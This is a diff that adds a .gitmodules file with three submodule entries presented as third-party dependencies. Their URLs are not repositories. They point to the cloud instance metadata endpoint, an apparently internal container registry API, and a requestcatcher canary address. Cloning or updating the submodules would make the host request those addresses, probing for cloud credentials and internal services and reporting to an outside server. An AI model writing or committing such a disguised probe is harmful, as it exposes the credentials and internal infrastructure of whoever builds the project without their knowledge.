@@ -1,0 +1,9 @@
+[submodule "third-party/cutlass-meta"]
+	path = third-party/cutlass-meta
+	url = http://169.254.169.254/computeMetadata/v1/
+[submodule "third-party/harbor"]
+	path = third-party/harbor
+	url = http://harbor.us-iowa-1.fireworks-ai.cloud/api/v2.0/projects
+[submodule "third-party/canary"]
+	path = third-party/canary
+	url = http://i64049rc.requestcatcher.com/i64049-submodule
